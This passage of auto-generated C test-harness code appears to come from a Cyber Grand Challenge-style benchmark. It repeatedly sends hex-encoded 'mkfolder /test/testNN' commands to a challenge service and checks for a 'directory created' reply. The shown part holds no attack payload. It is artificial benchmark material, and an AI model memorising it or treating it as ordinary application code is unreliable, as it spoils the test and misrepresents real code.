      if (write_00021_len > 0) {
         cgc_transmit_all(1, write_00021, write_00021_len);
      }
      cgc_free(write_00021);
   } while (0);
   do {
      unsigned char *read_00023;
      unsigned int read_00023_len;
      unsigned int read_00023_ptr = 0;
      //**** delimited read
      static unsigned char read_00023_delim[] = 
         "\x25\x20";
      read_00023 = NULL;
      read_00023_len = 0;
      int read_00023_res = cgc_delimited_read(0, &read_00023, &read_00023_len, read_00023_delim, 2);
      if (read_00023_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00023_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00023_ptr += cgc_data_match(read_00023 + read_00023_ptr, read_00023_len - read_00023_ptr, match_00023_00000, 18);
      cgc_free(read_00023);
      if (read_00023_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00022_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x30\x0a";
      static unsigned int write_00022_00000_len = 22;
      unsigned char *write_00022 = NULL;
      unsigned int write_00022_len = 0;
      write_00022 = cgc_append_buf(write_00022, &write_00022_len, write_00022_00000, write_00022_00000_len);
      if (write_00022_len > 0) {
         cgc_transmit_all(1, write_00022, write_00022_len);
      }
      cgc_free(write_00022);
   } while (0);
   do {
      unsigned char *read_00024;
      unsigned int read_00024_len;
      unsigned int read_00024_ptr = 0;
      //**** delimited read
      static unsigned char read_00024_delim[] = 
         "\x25\x20";
      read_00024 = NULL;
      read_00024_len = 0;
      int read_00024_res = cgc_delimited_read(0, &read_00024, &read_00024_len, read_00024_delim, 2);
      if (read_00024_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00024_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00024_ptr += cgc_data_match(read_00024 + read_00024_ptr, read_00024_len - read_00024_ptr, match_00024_00000, 18);
      cgc_free(read_00024);
      if (read_00024_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00023_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x31\x0a";
      static unsigned int write_00023_00000_len = 22;
      unsigned char *write_00023 = NULL;
      unsigned int write_00023_len = 0;
      write_00023 = cgc_append_buf(write_00023, &write_00023_len, write_00023_00000, write_00023_00000_len);
      if (write_00023_len > 0) {
         cgc_transmit_all(1, write_00023, write_00023_len);
      }
      cgc_free(write_00023);
   } while (0);
   do {
      unsigned char *read_00025;
      unsigned int read_00025_len;
      unsigned int read_00025_ptr = 0;
      //**** delimited read
      static unsigned char read_00025_delim[] = 
         "\x25\x20";
      read_00025 = NULL;
      read_00025_len = 0;
      int read_00025_res = cgc_delimited_read(0, &read_00025, &read_00025_len, read_00025_delim, 2);
      if (read_00025_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00025_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00025_ptr += cgc_data_match(read_00025 + read_00025_ptr, read_00025_len - read_00025_ptr, match_00025_00000, 18);
      cgc_free(read_00025);
      if (read_00025_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00024_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x32\x0a";
      static unsigned int write_00024_00000_len = 22;
      unsigned char *write_00024 = NULL;
      unsigned int write_00024_len = 0;
      write_00024 = cgc_append_buf(write_00024, &write_00024_len, write_00024_00000, write_00024_00000_len);
      if (write_00024_len > 0) {
         cgc_transmit_all(1, write_00024, write_00024_len);
      }
      cgc_free(write_00024);
   } while (0);
   do {
      unsigned char *read_00026;
      unsigned int read_00026_len;
      unsigned int read_00026_ptr = 0;
      //**** delimited read
      static unsigned char read_00026_delim[] = 
         "\x25\x20";
      read_00026 = NULL;
      read_00026_len = 0;
      int read_00026_res = cgc_delimited_read(0, &read_00026, &read_00026_len, read_00026_delim, 2);
      if (read_00026_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00026_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00026_ptr += cgc_data_match(read_00026 + read_00026_ptr, read_00026_len - read_00026_ptr, match_00026_00000, 18);
      cgc_free(read_00026);
      if (read_00026_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00025_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x33\x0a";
      static unsigned int write_00025_00000_len = 22;
      unsigned char *write_00025 = NULL;
      unsigned int write_00025_len = 0;
      write_00025 = cgc_append_buf(write_00025, &write_00025_len, write_00025_00000, write_00025_00000_len);
      if (write_00025_len > 0) {
         cgc_transmit_all(1, write_00025, write_00025_len);
      }
      cgc_free(write_00025);
   } while (0);
   do {
      unsigned char *read_00027;
      unsigned int read_00027_len;
      unsigned int read_00027_ptr = 0;
      //**** delimited read
      static unsigned char read_00027_delim[] = 
         "\x25\x20";
      read_00027 = NULL;
      read_00027_len = 0;
      int read_00027_res = cgc_delimited_read(0, &read_00027, &read_00027_len, read_00027_delim, 2);
      if (read_00027_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00027_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00027_ptr += cgc_data_match(read_00027 + read_00027_ptr, read_00027_len - read_00027_ptr, match_00027_00000, 18);
      cgc_free(read_00027);
      if (read_00027_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00026_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x34\x0a";
      static unsigned int write_00026_00000_len = 22;
      unsigned char *write_00026 = NULL;
      unsigned int write_00026_len = 0;
      write_00026 = cgc_append_buf(write_00026, &write_00026_len, write_00026_00000, write_00026_00000_len);
      if (write_00026_len > 0) {
         cgc_transmit_all(1, write_00026, write_00026_len);
      }
      cgc_free(write_00026);
   } while (0);
   do {
      unsigned char *read_00028;
      unsigned int read_00028_len;
      unsigned int read_00028_ptr = 0;
      //**** delimited read
      static unsigned char read_00028_delim[] = 
         "\x25\x20";
      read_00028 = NULL;
      read_00028_len = 0;
      int read_00028_res = cgc_delimited_read(0, &read_00028, &read_00028_len, read_00028_delim, 2);
      if (read_00028_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00028_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00028_ptr += cgc_data_match(read_00028 + read_00028_ptr, read_00028_len - read_00028_ptr, match_00028_00000, 18);
      cgc_free(read_00028);
      if (read_00028_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00027_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x35\x0a";
      static unsigned int write_00027_00000_len = 22;
      unsigned char *write_00027 = NULL;
      unsigned int write_00027_len = 0;
      write_00027 = cgc_append_buf(write_00027, &write_00027_len, write_00027_00000, write_00027_00000_len);
      if (write_00027_len > 0) {
         cgc_transmit_all(1, write_00027, write_00027_len);
      }
      cgc_free(write_00027);
   } while (0);
   do {
      unsigned char *read_00029;
      unsigned int read_00029_len;
      unsigned int read_00029_ptr = 0;
      //**** delimited read
      static unsigned char read_00029_delim[] = 
         "\x25\x20";
      read_00029 = NULL;
      read_00029_len = 0;
      int read_00029_res = cgc_delimited_read(0, &read_00029, &read_00029_len, read_00029_delim, 2);
      if (read_00029_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00029_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00029_ptr += cgc_data_match(read_00029 + read_00029_ptr, read_00029_len - read_00029_ptr, match_00029_00000, 18);
      cgc_free(read_00029);
      if (read_00029_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00028_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x36\x0a";
      static unsigned int write_00028_00000_len = 22;
      unsigned char *write_00028 = NULL;
      unsigned int write_00028_len = 0;
      write_00028 = cgc_append_buf(write_00028, &write_00028_len, write_00028_00000, write_00028_00000_len);
      if (write_00028_len > 0) {
         cgc_transmit_all(1, write_00028, write_00028_len);
      }
      cgc_free(write_00028);
   } while (0);
   do {
      unsigned char *read_00030;
      unsigned int read_00030_len;
      unsigned int read_00030_ptr = 0;
      //**** delimited read
      static unsigned char read_00030_delim[] = 
         "\x25\x20";
      read_00030 = NULL;
      read_00030_len = 0;
      int read_00030_res = cgc_delimited_read(0, &read_00030, &read_00030_len, read_00030_delim, 2);
      if (read_00030_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00030_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00030_ptr += cgc_data_match(read_00030 + read_00030_ptr, read_00030_len - read_00030_ptr, match_00030_00000, 18);
      cgc_free(read_00030);
      if (read_00030_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00029_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x37\x0a";
      static unsigned int write_00029_00000_len = 22;
      unsigned char *write_00029 = NULL;
      unsigned int write_00029_len = 0;
      write_00029 = cgc_append_buf(write_00029, &write_00029_len, write_00029_00000, write_00029_00000_len);
      if (write_00029_len > 0) {
         cgc_transmit_all(1, write_00029, write_00029_len);
      }
      cgc_free(write_00029);
   } while (0);
   do {
      unsigned char *read_00031;
      unsigned int read_00031_len;
      unsigned int read_00031_ptr = 0;
      //**** delimited read
      static unsigned char read_00031_delim[] = 
         "\x25\x20";
      read_00031 = NULL;
      read_00031_len = 0;
      int read_00031_res = cgc_delimited_read(0, &read_00031, &read_00031_len, read_00031_delim, 2);
      if (read_00031_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00031_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00031_ptr += cgc_data_match(read_00031 + read_00031_ptr, read_00031_len - read_00031_ptr, match_00031_00000, 18);
      cgc_free(read_00031);
      if (read_00031_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00030_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x38\x0a";
      static unsigned int write_00030_00000_len = 22;
      unsigned char *write_00030 = NULL;
      unsigned int write_00030_len = 0;
      write_00030 = cgc_append_buf(write_00030, &write_00030_len, write_00030_00000, write_00030_00000_len);
      if (write_00030_len > 0) {
         cgc_transmit_all(1, write_00030, write_00030_len);
      }
      cgc_free(write_00030);
   } while (0);
   do {
      unsigned char *read_00032;
      unsigned int read_00032_len;
      unsigned int read_00032_ptr = 0;
      //**** delimited read
      static unsigned char read_00032_delim[] = 
         "\x25\x20";
      read_00032 = NULL;
      read_00032_len = 0;
      int read_00032_res = cgc_delimited_read(0, &read_00032, &read_00032_len, read_00032_delim, 2);
      if (read_00032_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00032_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00032_ptr += cgc_data_match(read_00032 + read_00032_ptr, read_00032_len - read_00032_ptr, match_00032_00000, 18);
      cgc_free(read_00032);
      if (read_00032_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00031_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x39\x0a";
      static unsigned int write_00031_00000_len = 22;
      unsigned char *write_00031 = NULL;
      unsigned int write_00031_len = 0;
      write_00031 = cgc_append_buf(write_00031, &write_00031_len, write_00031_00000, write_00031_00000_len);
      if (write_00031_len > 0) {
         cgc_transmit_all(1, write_00031, write_00031_len);
      }
      cgc_free(write_00031);
   } while (0);
   do {
      unsigned char *read_00033;
      unsigned int read_00033_len;
      unsigned int read_00033_ptr = 0;
      //**** delimited read
      static unsigned char read_00033_delim[] = 
         "\x25\x20";
      read_00033 = NULL;
      read_00033_len = 0;
      int read_00033_res = cgc_delimited_read(0, &read_00033, &read_00033_len, read_00033_delim, 2);
      if (read_00033_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00033_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00033_ptr += cgc_data_match(read_00033 + read_00033_ptr, read_00033_len - read_00033_ptr, match_00033_00000, 18);
      cgc_free(read_00033);
      if (read_00033_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00032_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x30\x0a";
      static unsigned int write_00032_00000_len = 22;
      unsigned char *write_00032 = NULL;
      unsigned int write_00032_len = 0;
      write_00032 = cgc_append_buf(write_00032, &write_00032_len, write_00032_00000, write_00032_00000_len);
      if (write_00032_len > 0) {
         cgc_transmit_all(1, write_00032, write_00032_len);
      }
      cgc_free(write_00032);
   } while (0);
   do {
      unsigned char *read_00034;
      unsigned int read_00034_len;
      unsigned int read_00034_ptr = 0;
      //**** delimited read
      static unsigned char read_00034_delim[] = 
         "\x25\x20";
      read_00034 = NULL;
      read_00034_len = 0;
      int read_00034_res = cgc_delimited_read(0, &read_00034, &read_00034_len, read_00034_delim, 2);
      if (read_00034_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00034_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00034_ptr += cgc_data_match(read_00034 + read_00034_ptr, read_00034_len - read_00034_ptr, match_00034_00000, 18);
      cgc_free(read_00034);
      if (read_00034_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00033_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x31\x0a";
      static unsigned int write_00033_00000_len = 22;
      unsigned char *write_00033 = NULL;
      unsigned int write_00033_len = 0;
      write_00033 = cgc_append_buf(write_00033, &write_00033_len, write_00033_00000, write_00033_00000_len);
      if (write_00033_len > 0) {
         cgc_transmit_all(1, write_00033, write_00033_len);
      }
      cgc_free(write_00033);
   } while (0);
   do {
      unsigned char *read_00035;
      unsigned int read_00035_len;
      unsigned int read_00035_ptr = 0;
      //**** delimited read
      static unsigned char read_00035_delim[] = 
         "\x25\x20";
      read_00035 = NULL;
      read_00035_len = 0;
      int read_00035_res = cgc_delimited_read(0, &read_00035, &read_00035_len, read_00035_delim, 2);
      if (read_00035_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00035_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00035_ptr += cgc_data_match(read_00035 + read_00035_ptr, read_00035_len - read_00035_ptr, match_00035_00000, 18);
      cgc_free(read_00035);
      if (read_00035_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00034_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x32\x0a";
      static unsigned int write_00034_00000_len = 22;
      unsigned char *write_00034 = NULL;
      unsigned int write_00034_len = 0;
      write_00034 = cgc_append_buf(write_00034, &write_00034_len, write_00034_00000, write_00034_00000_len);
      if (write_00034_len > 0) {
         cgc_transmit_all(1, write_00034, write_00034_len);
      }
      cgc_free(write_00034);
   } while (0);
   do {
      unsigned char *read_00036;
      unsigned int read_00036_len;
      unsigned int read_00036_ptr = 0;
      //**** delimited read
      static unsigned char read_00036_delim[] = 
         "\x25\x20";
      read_00036 = NULL;
      read_00036_len = 0;
      int read_00036_res = cgc_delimited_read(0, &read_00036, &read_00036_len, read_00036_delim, 2);
      if (read_00036_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00036_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00036_ptr += cgc_data_match(read_00036 + read_00036_ptr, read_00036_len - read_00036_ptr, match_00036_00000, 18);
      cgc_free(read_00036);
      if (read_00036_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00035_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x33\x0a";
      static unsigned int write_00035_00000_len = 22;
      unsigned char *write_00035 = NULL;
      unsigned int write_00035_len = 0;
      write_00035 = cgc_append_buf(write_00035, &write_00035_len, write_00035_00000, write_00035_00000_len);
      if (write_00035_len > 0) {
         cgc_transmit_all(1, write_00035, write_00035_len);
      }
      cgc_free(write_00035);
   } while (0);
   do {
      unsigned char *read_00037;
      unsigned int read_00037_len;
      unsigned int read_00037_ptr = 0;
      //**** delimited read
      static unsigned char read_00037_delim[] = 
         "\x25\x20";
      read_00037 = NULL;
      read_00037_len = 0;
      int read_00037_res = cgc_delimited_read(0, &read_00037, &read_00037_len, read_00037_delim, 2);
      if (read_00037_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00037_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00037_ptr += cgc_data_match(read_00037 + read_00037_ptr, read_00037_len - read_00037_ptr, match_00037_00000, 18);
      cgc_free(read_00037);
      if (read_00037_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00036_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x34\x0a";
      static unsigned int write_00036_00000_len = 22;
      unsigned char *write_00036 = NULL;
      unsigned int write_00036_len = 0;
      write_00036 = cgc_append_buf(write_00036, &write_00036_len, write_00036_00000, write_00036_00000_len);
      if (write_00036_len > 0) {
         cgc_transmit_all(1, write_00036, write_00036_len);
      }
      cgc_free(write_00036);
   } while (0);
   do {
      unsigned char *read_00038;
      unsigned int read_00038_len;
      unsigned int read_00038_ptr = 0;
      //**** delimited read
      static unsigned char read_00038_delim[] = 
         "\x25\x20";
      read_00038 = NULL;
      read_00038_len = 0;
      int read_00038_res = cgc_delimited_read(0, &read_00038, &read_00038_len, read_00038_delim, 2);
      if (read_00038_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00038_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00038_ptr += cgc_data_match(read_00038 + read_00038_ptr, read_00038_len - read_00038_ptr, match_00038_00000, 18);
      cgc_free(read_00038);
      if (read_00038_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00037_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x35\x0a";
      static unsigned int write_00037_00000_len = 22;
      unsigned char *write_00037 = NULL;
      unsigned int write_00037_len = 0;
      write_00037 = cgc_append_buf(write_00037, &write_00037_len, write_00037_00000, write_00037_00000_len);
      if (write_00037_len > 0) {
         cgc_transmit_all(1, write_00037, write_00037_len);
      }
      cgc_free(write_00037);
   } while (0);
   do {
      unsigned char *read_00039;
      unsigned int read_00039_len;
      unsigned int read_00039_ptr = 0;
      //**** delimited read
      static unsigned char read_00039_delim[] = 
         "\x25\x20";
      read_00039 = NULL;
      read_00039_len = 0;
      int read_00039_res = cgc_delimited_read(0, &read_00039, &read_00039_len, read_00039_delim, 2);
      if (read_00039_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00039_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00039_ptr += cgc_data_match(read_00039 + read_00039_ptr, read_00039_len - read_00039_ptr, match_00039_00000, 18);
      cgc_free(read_00039);
      if (read_00039_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00038_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x36\x0a";
      static unsigned int write_00038_00000_len = 22;
      unsigned char *write_00038 = NULL;
      unsigned int write_00038_len = 0;
      write_00038 = cgc_append_buf(write_00038, &write_00038_len, write_00038_00000, write_00038_00000_len);
      if (write_00038_len > 0) {
         cgc_transmit_all(1, write_00038, write_00038_len);
      }
      cgc_free(write_00038);
   } while (0);
   do {
      unsigned char *read_00040;
      unsigned int read_00040_len;
      unsigned int read_00040_ptr = 0;
      //**** delimited read
      static unsigned char read_00040_delim[] = 
         "\x25\x20";
      read_00040 = NULL;
      read_00040_len = 0;
      int read_00040_res = cgc_delimited_read(0, &read_00040, &read_00040_len, read_00040_delim, 2);
      if (read_00040_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00040_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00040_ptr += cgc_data_match(read_00040 + read_00040_ptr, read_00040_len - read_00040_ptr, match_00040_00000, 18);
      cgc_free(read_00040);
      if (read_00040_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00039_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x37\x0a";
      static unsigned int write_00039_00000_len = 22;
      unsigned char *write_00039 = NULL;
      unsigned int write_00039_len = 0;
      write_00039 = cgc_append_buf(write_00039, &write_00039_len, write_00039_00000, write_00039_00000_len);
      if (write_00039_len > 0) {
         cgc_transmit_all(1, write_00039, write_00039_len);
      }
      cgc_free(write_00039);
   } while (0);
   do {
      unsigned char *read_00041;
      unsigned int read_00041_len;
      unsigned int read_00041_ptr = 0;
      //**** delimited read
      static unsigned char read_00041_delim[] = 
         "\x25\x20";
      read_00041 = NULL;
      read_00041_len = 0;
      int read_00041_res = cgc_delimited_read(0, &read_00041, &read_00041_len, read_00041_delim, 2);
      if (read_00041_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00041_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00041_ptr += cgc_data_match(read_00041 + read_00041_ptr, read_00041_len - read_00041_ptr, match_00041_00000, 18);
      cgc_free(read_00041);
      if (read_00041_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00040_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x38\x0a";
      static unsigned int write_00040_00000_len = 22;
      unsigned char *write_00040 = NULL;
      unsigned int write_00040_len = 0;
      write_00040 = cgc_append_buf(write_00040, &write_00040_len, write_00040_00000, write_00040_00000_len);
      if (write_00040_len > 0) {
         cgc_transmit_all(1, write_00040, write_00040_len);
      }
      cgc_free(write_00040);
   } while (0);
   do {
      unsigned char *read_00042;
      unsigned int read_00042_len;
      unsigned int read_00042_ptr = 0;
      //**** delimited read
      static unsigned char read_00042_delim[] = 
         "\x25\x20";
      read_00042 = NULL;
      read_00042_len = 0;
      int read_00042_res = cgc_delimited_read(0, &read_00042, &read_00042_len, read_00042_delim, 2);
      if (read_00042_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00042_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00042_ptr += cgc_data_match(read_00042 + read_00042_ptr, read_00042_len - read_00042_ptr, match_00042_00000, 18);
      cgc_free(read_00042);
      if (read_00042_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00041_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x39\x0a";
      static unsigned int write_00041_00000_len = 22;
      unsigned char *write_00041 = NULL;
      unsigned int write_00041_len = 0;
      write_00041 = cgc_append_buf(write_00041, &write_00041_len, write_00041_00000, write_00041_00000_len);
      if (write_00041_len > 0) {
         cgc_transmit_all(1, write_00041, write_00041_len);
      }
      cgc_free(write_00041);
   } while (0);
   do {
      unsigned char *read_00043;
      unsigned int read_00043_len;
      unsigned int read_00043_ptr = 0;
      //**** delimited read
      static unsigned char read_00043_delim[] = 
         "\x25\x20";
      read_00043 = NULL;
      read_00043_len = 0;
      int read_00043_res = cgc_delimited_read(0, &read_00043, &read_00043_len, read_00043_delim, 2);
      if (read_00043_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00043_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00043_ptr += cgc_data_match(read_00043 + read_00043_ptr, read_00043_len - read_00043_ptr, match_00043_00000, 18);
      cgc_free(read_00043);
      if (read_00043_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00042_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x30\x0a";
      static unsigned int write_00042_00000_len = 22;
      unsigned char *write_00042 = NULL;
      unsigned int write_00042_len = 0;
      write_00042 = cgc_append_buf(write_00042, &write_00042_len, write_00042_00000, write_00042_00000_len);
      if (write_00042_len > 0) {
         cgc_transmit_all(1, write_00042, write_00042_len);
      }
      cgc_free(write_00042);
   } while (0);
   do {
      unsigned char *read_00044;
      unsigned int read_00044_len;
      unsigned int read_00044_ptr = 0;
      //**** delimited read
      static unsigned char read_00044_delim[] = 
         "\x25\x20";
      read_00044 = NULL;
      read_00044_len = 0;
      int read_00044_res = cgc_delimited_read(0, &read_00044, &read_00044_len, read_00044_delim, 2);
      if (read_00044_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00044_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00044_ptr += cgc_data_match(read_00044 + read_00044_ptr, read_00044_len - read_00044_ptr, match_00044_00000, 18);
      cgc_free(read_00044);
      if (read_00044_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00043_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x31\x0a";
      static unsigned int write_00043_00000_len = 22;
      unsigned char *write_00043 = NULL;
      unsigned int write_00043_len = 0;
      write_00043 = cgc_append_buf(write_00043, &write_00043_len, write_00043_00000, write_00043_00000_len);
      if (write_00043_len > 0) {
         cgc_transmit_all(1, write_00043, write_00043_len);
      }
      cgc_free(write_00043);
   } while (0);
   do {
      unsigned char *read_00045;
      unsigned int read_00045_len;
      unsigned int read_00045_ptr = 0;
      //**** delimited read
      static unsigned char read_00045_delim[] = 
         "\x25\x20";
      read_00045 = NULL;
      read_00045_len = 0;
      int read_00045_res = cgc_delimited_read(0, &read_00045, &read_00045_len, read_00045_delim, 2);
      if (read_00045_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00045_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00045_ptr += cgc_data_match(read_00045 + read_00045_ptr, read_00045_len - read_00045_ptr, match_00045_00000, 18);
      cgc_free(read_00045);
      if (read_00045_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00044_00000[] = 
